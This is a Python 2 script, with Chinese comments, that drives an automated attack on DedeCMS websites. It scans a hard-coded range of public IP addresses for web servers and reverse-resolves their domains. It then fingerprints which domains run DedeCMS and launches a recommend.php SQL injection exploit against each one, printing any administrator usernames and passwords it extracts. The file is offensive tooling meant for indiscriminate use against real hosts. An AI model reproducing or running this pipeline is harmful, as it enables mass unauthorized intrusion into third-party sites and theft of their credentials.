#coding=utf-8
import requests
import json
import urllib
import sys
import os
import socket
import time
import re
from bs4 import BeautifulSoup
from dede_feature import matches
from util import Util
from dede_recommend_exploit import DedeAttacker
from ip_reverse import IPReverse
from scanner import Scanner
from dede_detector import DetectDeDeCMS
'''
工作类
负责调用模块完成业务逻辑
'''
class Worker():
	def __init__(self,ip1,ip2):
		self.startip = ip1
		self.endip = ip2
	def doJob(self):
		myscanner = Scanner()
		ipreverse = IPReverse()
		dededetector = DetectDeDeCMS()
		domain_list = []
		tmp_list = []
		dede_res = []
		ip_list = myscanner.WebScanner(self.startip,self.endip)
		for x in ip_list:
			tmp_list = ipreverse.getDomainsList(x)
			if tmp_list == None:
				continue
			domain_list = domain_list + tmp_list
		for x in domain_list:
			if not x:
				continue
			for i in x:
				if dededetector.getResult(i):
				    dede_res.append(i)
				else:
					continue
		return dede_res
'''
DEDE攻击程序
使用漏洞为：
recommend.php
用户推荐功能sql注入
'''
class DedeAttackProcess():
	def __init__(self):
		self.dede_attaker = DedeAttacker()
	def exploit(self,dede_list):
		for x in dede_list:
			url = "http://%s" % x
			print '-'*60
			print 'Target host is %s' % x
			res = self.dede_attaker.dede_recommend_exploit(url)
			if not res:
				print 'Exploit Failed!'
			else:
				print 'Exploit success!'
				result = res[0].split('|')
				print 'Username:%s\nPassword:%s' % (result[0],result[1])
		return ''

'''
实现的业务逻辑：
1、实现主机端口扫描（主要扫描80），获取开放80的主机列表（IP列表）
2、从IP列表中反查出绑定在每个item上的域名，获取域名列表
3、从域名列表中识别出使用dedecms的域名
4、开始漏洞攻击探测，识别出存在漏洞的主机
'''
if __name__ == '__main__':
	begin = time.time()
	dede_res = []
	util = Util()
	print 'Job starting....\nPlease wait....'
	myworker = Worker('219.235.5.52','219.235.5.54')
	#myworker = Worker('219.235.5.1','219.235.5.80')

	dede_res = myworker.doJob()
	current = time.time() - begin
	print 'Cost :%s s' % str(current)
	if dede_res == []:
		print u'No such web-app'
	else:
		print  u'The results are displayed below:'
		util.list_display(dede_res)
	#攻击开始
	dede_attaker = DedeAttackProcess()
	dede_attaker.exploit(dede_res)





	 
	





